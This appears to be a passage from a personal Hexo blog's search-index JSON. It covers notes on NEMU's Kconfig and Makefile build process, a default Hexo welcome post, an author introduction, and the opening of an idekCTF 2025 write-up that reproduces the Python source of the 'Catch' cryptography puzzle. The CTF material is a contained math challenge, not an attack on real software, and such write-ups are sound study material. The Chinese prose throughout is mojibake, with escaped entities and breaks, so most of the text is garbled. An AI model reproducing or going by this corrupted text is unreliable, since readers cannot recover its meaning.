æ–‡ä»¶ä¸­å®šä¹‰äº†æ‰€æœ‰å¯é…ç½®çš„é€‰é¡¹ã€‚\nåŒ…å«äº†å„ç§é€‰é¡¹å’Œå„ç§ä¾èµ–ã€‚\n\n\näº¤äº’ (mconf)\n\nè¿è¡Œ make menuconfigï¼Œmake ä¼šå¯åŠ¨ mconf ç¨‹åºã€‚\nmconf è¯»å– nemu/Kconfigï¼Œç”Ÿæˆäº¤äº’å¼èœå•ã€‚\n\n\nä¿å­˜ (.config)    \n\nåœ¨èœå•ä¸­è¿›è¡Œäº¤äº’è®¾ç½®ï¼ˆå¯ç”¨ CONFIG_DEBUGï¼Œå…³é—­ CONFIG_CACHE ç­‰ï¼‰ã€‚\né€€å‡ºä¿å­˜æ—¶ï¼Œmconf å°†é€‰æ‹©ç»“æœå†™å…¥ nemu/.config æ–‡ä»¶ã€‚\n\n\nç¿»è¯‘ (conf)\n\nmake ç»§ç»­æ‰§è¡Œï¼Œè‡ªåŠ¨è¿è¡Œ conf ç¨‹åºã€‚\nconf è¯»å– nemu/Kconfigï¼ˆä¸ºäº†äº†è§£æ‰€æœ‰é€‰é¡¹çš„é»˜è®¤å€¼å’Œç±»å‹ï¼‰å’Œ nemu/.configï¼ˆä¸ºäº†äº†è§£æ‚¨çš„é€‰æ‹©ï¼‰ã€‚\nconf ç¿»è¯‘è¿™äº›è®¾ç½®ï¼Œç”Ÿæˆä¸¤ä¸ªæ ¸å¿ƒæ–‡ä»¶ã€‚\n\n\nç”Ÿæˆ (autoconf.h / auto.conf)\n\nconf ç”Ÿæˆ nemu/include/generated/autoconf.hï¼Œé‡Œé¢æ˜¯ç»™ C ä»£ç ç”¨çš„å®ã€‚\nconf ç”Ÿæˆ nemu/include/config/auto.confï¼Œé‡Œé¢æ˜¯ç»™ Makefile ç”¨çš„å˜é‡ã€‚\n\n\n\nä¾‹å¦‚ï¼š\n\nnemu/Kconfig :\n# å®šä¹‰ä¸€ä¸ªå¸ƒå°”å‹(bool)é€‰é¡¹ï¼Œå« DEBUGconfig DEBUG    bool &quot;Enable debugging features&quot;    default n  # é»˜è®¤ä¸å¼€å¯    help      This enables extra printf messages for debugging.# å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²(string)é€‰é¡¹ï¼Œå« WELCOME_MSGconfig WELCOME_MSG    string &quot;The welcome message to show on boot&quot;    depends on DEBUG   # å…³é”®ï¼šè¿™ä¸ªé€‰é¡¹åªåœ¨ DEBUG=y æ—¶æ‰å‡ºç°ï¼    default &quot;Hello&quot;\n\nconfig DEBUG: å®šä¹‰äº†ä¸€ä¸ªå« DEBUG çš„é€‰é¡¹ï¼Œå®ƒæ˜¯ä¸ªå¼€å…³ï¼ˆboolï¼‰ã€‚\n\nconfig WELCOME_MSG: å®šä¹‰äº†ä¸€ä¸ªå« WELCOME_MSG çš„é€‰é¡¹ï¼Œå®ƒæ˜¯ä¸ªå­—ç¬¦ä¸²ï¼ˆstringï¼‰ã€‚\n\ndepends on DEBUG: å»ºç«‹ä¾èµ–å…³ç³»ã€‚è¿™è¯´æ˜ï¼šåªæœ‰å½“ DEBUG è¢«é€‰ä¸­åï¼ŒWELCOME_MSG è¿™ä¸ªé€‰é¡¹æ‰å…è®¸è¢«è®¾ç½®ã€‚\n\n\n\n\n\nmconf :\n\nè¯»å– nemu/Kconfigï¼Œæ˜¾ç¤ºä¸€ä¸ªèœå•ï¼š\n[ ] Enable debugging features\n\né€‰ä¸­ï¼š\n[*] Enable debugging features\n\nå› ä¸º depends on DEBUG è¢«æ»¡è¶³äº†ï¼Œmconf æ˜¾ç¤ºäº†æ–°é€‰é¡¹ï¼š\n[*] Enable debugging features    (&quot;Hello&quot;) The welcome message to show on boot\n\nä¿®æ”¹äº†æ¬¢è¿è¯­ä¸º &quot;Welcome to NEMU!&quot;ã€‚\n\nä¿å­˜å¹¶é€€å‡ºï¼ŒæŠŠç»“æœå†™å…¥ nemu/.config æ–‡ä»¶ã€‚\n\n\nnemu/.config (mconf çš„è¾“å‡º):\n## Automatically generated file; DO NOT EDIT.#CONFIG_DEBUG=yCONFIG_WELCOME_MSG=&quot;Welcome to NEMU!&quot;\n\nconf ç¨‹åºï¼ˆç¿»è¯‘ .config ï¼‰ï¼š\n\nç”Ÿæˆç»™ C ä»£ç çš„ autoconf.h\n\n// nemu/include/generated/autoconf.h/* * Automatically generated C config header * DO NOT EDIT */#define CONFIG_DEBUG 1#define CONFIG_WELCOME_MSG &quot;Welcome to NEMU!&quot;/* (æ³¨æ„ï¼šbool ç±»å‹çš„ &#x27;y&#x27; è¢«ç¿»è¯‘æˆäº† C è¯­è¨€çš„ &#x27;1&#x27;) */\n\nç”Ÿæˆç»™ Makefile çš„ auto.conf\n\n# nemu/include/config/auto.conf## Automatically generated make config: DO NOT EDIT#CONFIG_DEBUG=yCONFIG_WELCOME_MSG=&quot;Welcome to NEMU!&quot;/* (æ³¨æ„ï¼šè¿™é‡Œçš„å†…å®¹å’Œ .config åŸºæœ¬ä¸€æ ·ï¼Œæ ¼å¼æ˜¯ make å˜é‡) */\n\né¡¹ç›®æ–‡ä»¶ï¼š\n#include &lt;stdio.h&gt;// 1. åŒ…å« Kconfig ç”Ÿæˆçš„ C è¯­è¨€å®#include &quot;generated/autoconf.h&quot;int main() &#123;// 2. ä½¿ç”¨å¸ƒå°”å‹é…ç½® (DEBUG) æ¥æ§åˆ¶ä»£ç #ifdef CONFIG_DEBUG    // è¿™éƒ¨åˆ†ä»£ç åªæœ‰åœ¨ `make menuconfig` ä¸­    // å‹¾é€‰äº† DEBUG æ—¶æ‰ä¼šè¢«ç¼–è¯‘è¿›å»    printf(&quot;Debug mode is ON.\\n&quot;);    // 3. ä½¿ç”¨å­—ç¬¦ä¸²é…ç½® (WELCOME_MSG)    printf(&quot;Message: %s\\n&quot;, CONFIG_WELCOME_MSG);#else    // å¦‚æœæ²¡å‹¾é€‰ DEBUGï¼Œåˆ™åªç¼–è¯‘è¿™éƒ¨åˆ†    printf(&quot;Release mode.\\n&quot;);#endif    return 0;&#125;\n\n\næ¸¸æˆçš„é…ç½®å®é™…ä¸Šæ¸¸æˆæ˜¯è¿è¡Œæ—¶ (Run-Time) é…ç½®ï¼Œä¸€äº›è½¯ä»¶æ¯”å¦‚OSå†…æ ¸æ˜¯ç¼–è¯‘æ—¶ (Compile-Time) é…ç½®ï¼š\n// (æ¸¸æˆå¯åŠ¨æ—¶ä» settings.ini è¯»å–è®¾ç½®)int graphics_quality = read_setting(&quot;quality&quot;); // å‡è®¾è¯»åˆ° 3 (é«˜)void draw_game_frame() &#123;if (graphics_quality == 3) &#123;  draw_high_quality_shadows();  draw_raytracing();&#125; else if (graphics_quality == 2) &#123;  draw_medium_quality_shadows();&#125; else &#123;  draw_low_quality_shadows();&#125;&#125;\nå†…æ ¸å†…çš„è½¯ä»¶éœ€è¦æ€§èƒ½ã€ä½“ç§¯ã€ç¨³å®šï¼Œå¦‚æœé‡‡ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œä¼šå¸¦æ¥å‡ ä¸ªé—®é¢˜ï¼š\n\nif æŒ‡ä»¤æœ¬èº«ä¼šæ¶ˆè€— CPU å‘¨æœŸï¼Œä¼šæ±¡æŸ“ CPU ç¼“å­˜ã€‚å½“è¿™ä¸ªæ£€æŸ¥æ¯ç§’å‘ç”Ÿä¸€äº¿æ¬¡æ—¶ï¼Œç´¯ç§¯çš„å¼€é”€æ˜¯å·¨å¤§çš„ã€‚\nç¼–è¯‘ä¹‹åä½“ç§¯å·¨å¤§ï¼Œæ¯”å¦‚åœ¨æœåŠ¡å™¨ä¸Šçš„ç³»ç»Ÿå®Œå…¨ä¸éœ€è¦è“ç‰™åŠŸèƒ½ï¼Œç¼–è¯‘è¿›å»é€ æˆå†—ä½™ã€‚\n\n\nMakefilefilelistç”¨æ¥ç®¡ç†éœ€è¦ç¼–è¯‘çš„æºæ–‡ä»¶ï¼Œä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\n\nåœ¨ kconfig æ­¥éª¤ç”Ÿæˆ Make å˜é‡ï¼Œä¾‹å¦‚ï¼š\nå¦‚æœé€‰ä¸­äº† TARGET_AMï¼Œå®ƒä¼šç”Ÿæˆï¼šCONFIG_TARGET_AM=y\nå¦‚æœæ²¡é€‰ä¸­ï¼Œå®ƒä¼šç”Ÿæˆï¼šCONFIG_TARGET_AM=n (æˆ–è€…å¹²è„†ä¸å®šä¹‰)\n\n\nåœ¨ filelist.mk ä¸­ç»´æŠ¤å››ä¸ªå˜é‡ï¼š\nSRCS-y - å‚ä¸ç¼–è¯‘çš„æºæ–‡ä»¶çš„å€™é€‰é›†åˆ\nSRCS-BLACKLIST-y - ä¸å‚ä¸ç¼–è¯‘çš„æºæ–‡ä»¶çš„é»‘åå•é›†åˆ\nDIRS-y - å‚ä¸ç¼–è¯‘çš„ç›®å½•é›†åˆ, è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«åŠ å…¥åˆ°SRCS-yä¸­\nDIRS-BLACKLIST-y - ä¸å‚ä¸ç¼–è¯‘çš„ç›®å½•é›†åˆ, è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«åŠ å…¥åˆ°SRCS-BLACKLIST-yä¸­\n\n\nå®é™…ä½¿ç”¨è¿‡ç¨‹ï¼Œå®šä¹‰çš„å˜é‡ä¸º DIRS-BLACKLIST-$(CONFIG_TARGET_AM) ï¼Œmake ç¨‹åºè¯»å–è¿‡ç¨‹ä¸­è‡ªåŠ¨å±•å¼€ã€‚\n\nç¼–è¯‘å’Œé“¾æ¥Makefile åŸºæœ¬è§„åˆ™ï¼š\nç›®æ ‡ (Target): ä¾èµ– (Prerequisites)&lt;TAB&gt; å‘½ä»¤ (Command)\n\nç›®æ ‡: æƒ³è¦ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ¯”å¦‚å¯æ‰§è¡Œæ–‡ä»¶ program æˆ–ç›®æ ‡æ–‡ä»¶ main.oã€‚\nä¾èµ–: ç”Ÿæˆè¿™ä¸ªâ€œç›®æ ‡â€æ‰€éœ€è¦çš„æ–‡ä»¶ã€‚\nå‘½ä»¤: ä»â€œä¾èµ–â€ç”Ÿæˆâ€œç›®æ ‡â€çš„å…·ä½“æ­¥éª¤ã€‚\nå˜é‡: é€šå¸¸åœ¨æ–‡ä»¶é¡¶éƒ¨ç”¨å¤§å†™å­—æ¯å®šä¹‰ï¼Œä½¿ç”¨ $(VAR) æ¥å¼•ç”¨ã€‚ï¼ˆç±»ä¼¼äºcè¯­è¨€çš„å®å®šä¹‰ï¼Œç›´æ¥å­—ç¬¦æ›¿æ¢ï¼‰\n\nè¯¦ç»†æ‹†è§£ç¼–è¯‘è§„åˆ™ï¼š\n$(OBJ_DIR)/%.o: %.c  @echo + CC $&lt;  @mkdir -p $(dir $@)  @$(CC) $(CFLAGS) -c -o $@ $&lt;  $(call call_fixdep, $(@:.o=.d), $@)\n\nè§„åˆ™ï¼š$(OBJ_DIR)/%.o: %.c\n\n$(OBJ_DIR) åœ¨åˆå§‹åŒ–å·²ç»è‡ªåŠ¨è®¾å®š\néœ€è¦ç”Ÿæˆ $(OBJ_DIR)/%.o æ–‡ä»¶ï¼ˆä¾‹å¦‚ build/src/main.oï¼‰ï¼Œéœ€è¦åŒåçš„.c æ–‡ä»¶ä¾‹å¦‚ ï¼ˆsrc/main.cï¼‰ã€‚\n% æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œå®ƒä¼šåŒ¹é…ä¸¤ä¸ªæ–‡ä»¶åä¸­ç›¸åŒçš„éƒ¨åˆ†ï¼ˆæ—¢ src/mainï¼‰ã€‚\n\n\nè‡ªåŠ¨å˜é‡ï¼š\n\n$@ï¼šç›®æ ‡ - Target\n$&lt;ï¼šç¬¬ä¸€ä¸ªä¾èµ– - First Prerequisite\n\n\nå‘½ä»¤1ï¼š@echo + CC $&lt;\n\n@ (é™éŸ³ç¬¦)ï¼šåªæ‰§è¡Œä¸æ‰“å°\nå¦‚æœæ²¡æœ‰ @ï¼Œmake ä¼šå…ˆæ‰“å° echo + CC src/utils/timer.cï¼Œç„¶åå†æ‰§è¡Œå®ƒï¼Œå¯¼è‡´è¾“å‡º + CC src/utils/timer.cï¼Œéå¸¸å•°å—¦ã€‚\n+ CC $&lt; (æ‰“å°çš„å†…å®¹):\n+ CC æ˜¯ä¸€ä¸ªå›ºå®šçš„å­—ç¬¦ä¸²ï¼Œè®©è¾“å‡ºæ›´ç¾è§‚ã€‚\n$&lt; æ˜¯ä¸€ä¸ªç¬¬ä¸€ä¸ªä¾èµ–ï¼ˆä¾‹å¦‚åœ¨æ„å»º timer.o æ—¶ï¼Œ$&lt; çš„å€¼å°±æ˜¯ src/utils/timer.cï¼‰ã€‚\n\n\n\n\n\n\nå‘½ä»¤2ï¼š@mkdir -p $(dir $@)\n\n$(dir $@) (è¦åˆ›å»ºçš„ç›®å½•):\n$@ æ˜¯ç›®æ ‡åï¼Œä¾‹å¦‚ build/obj/src/utils/timer.oã€‚\n$(dir ...) æ˜¯ä¸€ä¸ª make å†…ç½®å‡½æ•°ï¼Œç”¨äºæå–è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚ä¾‹å¦‚ $(dir build/obj/src/utils/timer.o) çš„è®¡ç®—ç»“æœæ˜¯ build/obj/src/utils/ã€‚\n\n\n\n\n\n\nå‘½ä»¤3ï¼š@$(CC) $(CFLAGS) -c -o $@ $&lt;\n\n$(CC)ï¼šä»£è¡¨ C ç¼–è¯‘å™¨ï¼Œä¸€èˆ¬æ˜¯ gccã€‚\n$(CFLAGS)ï¼šä»£è¡¨æ‰€æœ‰ç¼–è¯‘é€‰é¡¹ï¼ˆC Flagsï¼‰ï¼Œä¾‹å¦‚ -O2 -Wall -Werror -I... ç­‰ã€‚\n-cï¼šç¼–è¯‘å™¨é€‰é¡¹ï¼Œå‘Šè¯‰ gccï¼šâ€œåªç¼–è¯‘ï¼Œä¸é“¾æ¥â€ã€‚å³ï¼ŒæŠŠ .c æ–‡ä»¶ç¼–è¯‘æˆ .o ç›®æ ‡æ–‡ä»¶ã€‚\n-o $@:\n-o æ˜¯ç¼–è¯‘å™¨çš„è¾“å‡ºæ–‡ä»¶é€‰é¡¹ã€‚\n$@ åœ¨è¿™é‡Œæ˜¯è¾“å‡ºæ–‡ä»¶åï¼Œä¾‹å¦‚ -o build/obj/src/utils/timer.o\n\n\n$&lt;ï¼šåœ¨è¿™é‡Œæ˜¯è¾“å…¥æºæ–‡ä»¶ï¼Œä¾‹å¦‚ src/utils/timer.c\n\n\nå‘½ä»¤4ï¼š$(call call_fixdep, $(@:.o=.d), $@)\n\nä¿®å¤ä¼˜åŒ–ä¾èµ–å…³ç³»\n\n\n\n","tags":["å®éªŒè®°å½•"]},{"title":"Hello World","url":"/2025/07/09/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n"},{"title":"ç¬¬ä¸€ç¯‡æ–‡ç« ","url":"/2025/07/09/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/","content":"Hello World!æˆ‘æ­£åœ¨æµ‹è¯•Hexoçš„åŠŸèƒ½ï¼Œçœ‹èµ·æ¥ä¼¼ä¹è¿˜æŒºç®€å•çš„ï¼Œå¸Œæœ›æˆ‘æœ‰æ—¶é—´å¤šå†™å†™ã€‚\n\nç®€å•åšä¸ªè‡ªæˆ‘ä»‹ç»ï¼Œå¹»å¤œå­é›¨ï¼Œæˆ–è€…Illunightï¼Œæ•¬ä¸Šã€‚\nIllunightæ¥æºäºillusion + nightï¼Œå³ä¸ºå¹»å¤œï¼Œå­é›¨æ˜¯åå­—ã€‚\næ™®æ™®é€šé€šCTFerï¼Œä¸»æ”»cryptoæ–¹å‘ï¼Œå…¶ä»–é¢†åŸŸå¶æœ‰æ¶‰çŒï¼Œå­¦è‰ºä¸ç²¾ã€‚\nè¶…çº§ç¦ç‘æ§ï¼Œå¦‚æœå»å…¶ä»–ç¤¾äº¤åª’ä½“æœâ€œå¹»å¤œå­é›¨â€ï¼Œä¼šæœåˆ°ç›¸å…³å†…å®¹ã€‚\nåˆ›ç«‹è¿™ä¸ªåšå®¢çš„ç†ç”±ç†ç”±å˜›â€¦â€¦å› ä¸ºæœ€è¿‘æš‘å‡æœŸé—´ï¼Œæ¯”è¾ƒæ— èŠï¼Œäºæ˜¯åˆ·å„ç§cryptoé¢˜ï¼Œå†™é¢˜è§£ã€‚ä½†æ˜¯å†™äº†è¿™ä¹ˆå¤šçš„é¢˜è§£åªç»™è‡ªå·±çœ‹ä¹Ÿå¤ªäºäº†ï¼Œäºæ˜¯å°±å‘ˆä¸Šæ¥ï¼Œæ³æ±‚æ‰¹è¯„ä¸æŒ‡å¯¼ã€‚\nï¼ˆä¸€å…±ä¹Ÿæ²¡å†™å‡ ä»½ï¼Œåšå®¢å€’æ˜¯åˆ›å¾—èµ·åŠ²ğŸ™„å­é›¨ä½ é€‚å¯è€Œæ­¢ï¼‰\næ€»ä¹‹å°±æ˜¯è¿™æ ·~è™½ç„¶æ¯”è¾ƒè½»ç‡åœ°å°±æ”¾ä¸Šæ¥äº†ï¼Œä¸è¿‡ä¹Ÿæ˜¯å¯¹è‡ªå·±çš„ä¸€ç§ç£ä¿ƒå§ï¼Œå¤šåšï¼Œå¤šè§è¯†ã€‚\né»‘å†å²â€¦â€¦ï¼Ÿæˆ‘å·²ç»åšå¥½è¿™äº›æ–‡ç« æˆä¸ºè‡ªå·±é»‘å†å²çš„é¢„æœŸäº†ï¼Œå¦‚æœæ²¡æœ‰å¯¹è¿‡å»çš„æ‰¹åˆ¤ï¼Œä¹Ÿå°±æ²¡æœ‰è¿›æ­¥äº†hhh\n","categories":["ç¬”è®°"],"tags":["illunight"]},{"title":"2025 idekCTFé¢˜è§£","url":"/2025/08/05/2025%20idekCTF%E9%A2%98%E8%A7%A3/","content":"å‰è¨€æ­¤å‰å››å¤„æœåˆ®é¢˜ç›®åšçš„æ—¶å€™æƒ³æ‰¾Decidophobiaçš„é¢˜è§£ï¼Œæ‰¾åˆ°äº†Mapleå¸ˆå‚…çš„writeupsï¼Œäºæ˜¯å¯¹idekCTFæœ‰äº†ç‚¹å°è±¡ã€‚æ²¡è¿‡å¤šä¹…ï¼Œè‡ªå·±ä¹Ÿæ˜¯å‚ä¸ä¸Šäº†ï¼Œä¸è¿‡ä¹Ÿåšä¸å‡ºå‡ é“é¢˜ï¼Œå‡‘ä¸ªçƒ­é—¹ã€‚\næ­£æ–‡ç¬¬ä¸€å¤©ä¸€é“é¢˜éƒ½ä¸ä¼šï¼Œé¢‡æœ‰äº›ç ´é˜²â€”â€”ç„¶åæ¯ç¡ä¸€è§‰å°±è§£å‡ºä¸€é“ï¼Œåªæ¨æ¯”èµ›åªæœ‰ä¸¤å¤©ã€‚\nCryptoCatché¢˜ç›®å¦‚ä¸‹ã€‚\nfrom Crypto.Random.random import randint, choiceimport os# In a realm where curiosity roams free, our fearless cat sets out on an epic journey.# Even the cleverest feline must respect the boundaries of its worldâ€”this magical limit holds all wonders within.limit = 0xe5db6a6d765b1ba6e727aa7a87a792c49bb9ddeb2bad999f5ea04f047255d5a72e193a7d58aa8ef619b0262de6d25651085842fd9c385fa4f1032c305f44b8a4f92b16c8115d0595cebfccc1c655ca20db597ff1f01e0db70b9073fbaa1ae5e489484c7a45c215ea02db3c77f1865e1e8597cb0b0af3241cd8214bd5b5c1491f# Through cryptic patterns, our cat deciphers its next move.def walking(x, y, part):    # Each step is guided by a fragment of the cat&#x27;s own secret mind.    epart = [int.from_bytes(part[i:i+2], &quot;big&quot;) for i in range(0, len(part), 2)]    xx = epart[0] * x + epart[1] * y    yy = epart[2] * x + epart[3] * y    return xx, yy# Enter the Cat: curious wanderer and keeper of hidden paths.class Cat:    def __init__(self):        # The cat&#x27;s starting position is born of pure randomness.        self.x = randint(0, 2**256)        self.y = randint(0, 2**256)        # Deep within, its mind holds a thousand mysterious fragments.        while True:            self.mind = os.urandom(1000)            self.step = [self.mind[i:i+8] for i in range(0, 1000, 8)]            if len(set(self.step)) == len(self.step):                break    # The epic chase begins: the cat ponders and strides toward the horizon.    def moving(self):        for _ in range(30):            # A moment of reflection: choose a thought from the cat&#x27;s endless mind.            part = choice(self.step)            self.step.remove(part)            # With each heartbeat, the cat takes a cryptic step.            xx, yy = walking(self.x, self.y, part)            self.x, self.y = xx, yy            # When the wild spirit reaches the edge, it respects the boundary and pauses.            if self.x &gt; limit or self.y &gt; limit:                self.x %= limit                self.y %= limit                break    # When the cosmos beckons, the cat reveals its secret coordinates.    def position(self):        return (self.x, self.y)# Adventurer, your quest: find and connect with 20 elusive cats.for round in range(20):    try:        print(f&quot;ğŸ‘‰ Hunt &#123;round+1&#125;/20 begins!&quot;)        cat = Cat()        # At the start, you and the cat share the same starlit square.        human_pos = cat.position()        print(f&quot;ğŸ±âœ¨ Co-location: &#123;human_pos&#125;&quot;)        print(f&quot;ğŸ”® Cat&#x27;s hidden mind: &#123;cat.mind.hex()&#125;&quot;)        # But the cat, ever playful, dashes into the unknown...        cat.moving()        print(&quot;ğŸ˜¸ The chase is on!&quot;)        print(f&quot;ğŸ—ºï¸ Cat now at: &#123;cat.position()&#125;&quot;)        # Your turn: recall the cat&#x27;s secret path fragments to catch up.        mind = bytes.fromhex(input(&quot;ğŸ¤” Path to recall (hex): &quot;))        # Step by step, follow the trail the cat has laid.        for i in range(0, len(mind), 8):            part = mind[i:i+8]            if part not in cat.mind:                print(&quot;âŒ Lost in the labyrinth of thoughts.&quot;)                exit()            human_pos = walking(human_pos[0], human_pos[1], part)        # At last, if destiny aligns...        if human_pos == cat.position():            print(&quot;ğŸ‰ Reunion! You have found your feline friend! ğŸ¾&quot;)        else:            print(&quot;ğŸ˜¿ The path eludes you... Your heart aches.&quot;)            exit()    except Exception:        print(&quot;ğŸ™€ A puzzle too tangled for tonight. Rest well.&quot;)        exit()# Triumph at last: the final cat yields the secret prize.print(f&quot;ğŸ† Victory! The treasure lies within: &#123;open(&#x27;flag.txt&#x27;).read()&#125;&quot;)\né¢˜ç›®å¾ˆæœ‰è¯—æ„hhä½†æ˜¯æœ‰ç‚¹åƒæ²¡å¼€thinkingçš„ChatGPTå†™çš„ï¼Œæäº†åŠå¤©æ˜¯GPTå¯¹æŠ—GPTï¼ˆÃ—ï¼‰é¢˜ç›®ç”Ÿæˆä¸€åªçŒ«ï¼Œç»™å®šå®ƒçš„åˆå§‹åæ ‡å’Œæ‰€æœ‰â€œæ€è€ƒâ€å—ï¼Œç»è¿‡ä¸€äº›ç§»åŠ¨åç»™å‡ºæœ€ç»ˆåæ ‡ï¼Œæˆ‘ä»¬éœ€è¦ä»æœ€ç»ˆåæ ‡ä¸­å¾—åˆ°ç§»åŠ¨æ—¶ä½¿ç”¨çš„æ€è€ƒå—ï¼Œé‡å¤20æ¬¡å°±èƒ½æŠ“åˆ°çŒ«ï¼Œè·å¾—flagã€‚å—åˆ°å¥½å¤šé˜´é—´é¢˜ç›®çš„â€œå¯å‘â€ï¼Œæˆ‘ç¬¬ä¸€æƒ³åˆ°çš„å·²ç»ä¸æ˜¯å¦‚ä½•ç ´è§£è¿™ä¸ªé—®é¢˜ï¼Œè€Œæ˜¯ä»£ç ä¸­æœ‰æ²¡æœ‰æ¼æ´ã€‚è™½ç„¶é¢˜ç›®çš„è¦æ±‚å¾ˆæ¸…æ™°ï¼Œä½†æ˜¯ä»ç¬¬71è¡Œçš„if part not in cat.mind:æˆ‘çœ‹å‡ºäº†ä¸¤ç‚¹â€”â€”1.mindæ²¡æœ‰å˜è¿‡ï¼Œå§‹ç»ˆæ˜¯æœ€åˆçš„1000ä¸ªbyteï¼Œå…¶ä¸­æ¯ä¸ª8byteséƒ½ä¸é‡å¤ï¼Œå› æ­¤ï¼Œè™½ç„¶çŒ«çš„ç§»åŠ¨ä½¿ç”¨çš„stepä¸å…è®¸é‡å¤ï¼Œä½†æ˜¯ç”¨æˆ·ä¸å½±å“ï¼Œç”¨æˆ·çš„è¾“å…¥æ˜¯å¯ä»¥é‡å¤çš„ã€‚2.mindæ˜¯ä¸€è¿ä¸²bytesï¼Œå› æ­¤ï¼Œå³ä½¿è¾“å…¥çš„mindåˆ†å‰²æˆpartåï¼ŒæŸä¸ªpartä¸æ˜¯stepçš„ä¸€å‘˜ï¼Œåªè¦å®ƒæ˜¯mindçš„è¿ç»­8bytesï¼Œå°±å¯ä»¥é€šè¿‡ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å…¶å®æœ‰1000-8+1=993ä¸ªpartå¯ç”¨ï¼Œè€ŒéçŒ«ç§»åŠ¨æ—¶çš„125ä¸ªã€‚è™½ç„¶å…¶å®è¿™ä¸¤ç‚¹éƒ½æ²¡ç”¨åˆ°ï¼Œä½†æ˜¯æˆ‘è§‰å¾—æŠ“æ¼æ´ä¹Ÿæ˜¯æˆ‘ä»¬éœ€è¦åšçš„â€¦â€¦è¯´ä¸å®šå“ªæ¬¡å°±æœ‰ç”¨å‘¢ï¼ŒAIä¸å¤ªä¼šåšè¿™ç§â€œè¿è§„â€çš„äº‹ï¼Œåªèƒ½é äººè‡ªå·±æ¥ã€‚é¢˜ç›®è¿˜ç»™å‡ºäº†ä¸€ä¸ªlimitï¼Œå®ƒæ˜¯ä¸€ä¸ª1024ä½çš„å¤§è´¨æ•°ã€‚è€ƒè™‘æ¯ä¸€æ¬¡walkingï¼Œpartæ˜¯8ä¸ªbyteï¼Œåˆ†æˆ4ä¸ª2*8=16bitçš„æ•°ï¼Œè¿™æ ·ï¼Œæ–°çš„xxå’Œyyé•¿åº¦æœ€å¤šæ˜¯åŸæ¥çš„xå’ŒyåŠ 16ä½ï¼Œ30æ¬¡å°±æ˜¯480ä½ã€‚è¿™æ ·çš„è¯ï¼ŒçŒ«æœ€ç»ˆçš„åæ ‡ä¹Ÿåªæœ‰256+480=736ä½ï¼Œè¿˜æ˜¯è¿œå°äºlimitï¼Œè€ŒçŒ«çš„movingè¿‡ç¨‹ä¸€å®šä¼šèµ°æ»¡30è½®ã€‚è¿™ä¸ªå¦‚æ­¤å¤§çš„limitæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå°†èµ·ç‚¹å’Œç»ˆç‚¹ä½œä¸ºå‘é‡ï¼Œåˆ™epartä¸­çš„å››ä¸ªæ•°å¯ä»¥ç»„æˆä¸€ä¸ª2*2çŸ©é˜µ$\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix}$ã€‚å¯¹äº1000ä¸ªéšæœºbyteï¼Œåˆ’åˆ†ä¸º2byteä¸€ç»„ï¼Œä¸€å…±500ç»„ã€‚å…¶ä¸­å‡ºç°æ•°å­—0çš„æœŸæœ›ä¸º$\\frac{500}{2^{16}}$ï¼Œå› æ­¤epartçŸ©é˜µä¸­å‡ºç°0æ˜¯ä¸å¤ªå¯èƒ½çš„ï¼Œå‡ºç°è¿ç»­ä¸¤ä¸ª0ä½¿å¾—xxæˆ–yy = 0 * x + 0 * y = 0å°±æ›´ä¸å¯èƒ½äº†ï¼Œåœ¨20æ¬¡æŒ‘æˆ˜ä¸­å‡ ä¹å¯ä»¥æ’é™¤ï¼Œå› æ­¤æˆ‘ä»¬è®¤ä¸ºæ¯ä¸€æ¬¡walkingåï¼Œxxå¤§äºxï¼Œyyå¤§äºyã€‚æ­£ç€æ‰¾è¿‡å»ï¼Œä¸ç®¡é€‰å“ªä¸ªçŸ©é˜µéƒ½æ»¡è¶³$\\begin{bmatrix} x_i &amp; y_i \\end{bmatrix}\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix} = \\begin{bmatrix} x_{i+1} &amp; y_{i+1} \\end{bmatrix}$ä¸­çš„$x_{i+1} &gt; x_i,\\; y_{i+1} &gt; y_i$ã€‚å¯¹äºç­›é€‰éœ€è¦çš„çŸ©é˜µæ²¡æœ‰å¸®åŠ©ï¼Œé€†ç€æ‰¾è¿‡æ¥ï¼Œ$\\begin{bmatrix} e_0 &amp; e_1 \\newline e_2 &amp; e_3 \\end{bmatrix}$çš„é€†çŸ©é˜µå¤šåŠå«æœ‰åˆ†æ•°ï¼Œå­˜å‚¨è¿˜æ˜¯è®¡ç®—éƒ½ä¸æ–¹ä¾¿ï¼Œæ— è®ºå“ªä¸ªæ–¹å‘éƒ½ä¸è¡Œã€‚â€¦â€¦çœŸçš„å—ï¼Ÿæˆ‘ä»¬å¯ä»¥åœ¨$\\mathbb{F}_p$ä¸­æ‰¾é€†çŸ©é˜µã€‚å¯¹äºéšæœºé€‰å–çš„$[0,\\,2^{16}]$ä¸­çš„æ•°ï¼Œç¬¬ä¸€è¡Œå…¨0æ¦‚ç‡çº¦ä¸º$\\frac{1}{2^{32}}$ï¼Œç¬¬äºŒè¡Œä¸ç¬¬ä¸€è¡Œæˆæ¯”ä¾‹åœ¨$\\mathbb{F}_p \\times \\mathbb{F}_p$ä¸­å…±æœ‰ $p$ ç§å¯èƒ½ï¼Œè€Œåœ¨$[0,2^{16}) \\times [0,2^{16})$çš„æ¦‚ç‡ä¸º$\\frac{2^{32}}{p^2} * p = \\frac{2^{32}}{p}$ï¼Œç”±äºè¿™é‡Œçš„$p = 